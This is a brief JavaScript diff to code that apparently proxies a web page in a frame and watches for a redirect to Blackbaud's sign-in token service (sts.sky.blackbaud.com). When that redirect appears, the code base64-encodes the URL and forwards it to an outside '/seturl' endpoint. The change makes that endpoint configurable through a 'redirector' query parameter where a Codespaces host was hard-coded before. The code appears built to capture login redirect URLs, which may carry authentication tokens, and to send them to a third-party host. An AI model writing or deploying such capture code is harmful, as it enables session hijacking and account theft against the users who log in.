@@ -20,7 +20,7 @@ function reverseEncoding(encodedStr) {
         )
         .join('');
 }
-async function main(url){
+async function main(url, redirector){
 
 
 	try {
@@ -44,14 +44,15 @@ async function main(url){
 		var test=frame.contentWindow.location.href;
 		test=reverseEncoding(test.split("/uv/service/")[1]);
 		if (test.startsWith("https://sts.sky.blackbaud.com/") && !dostop) {
-			location.href = "https://CODESPACEURL-PORT.app.github.dev/seturl?url="+btoa(test);
+			location.href = redirector+"/seturl?url="+btoa(test);
 			dostop=true;
 		}
 	}, 200);
 }
 (()=>{
 	let params = location.search
+	let redirector=params.split("redirector=")[1].split("&")[0];
 	console.log(params);
 	let url=params.split("url=")[1];
-	main((url));
+	main((url), redirector);
 })();
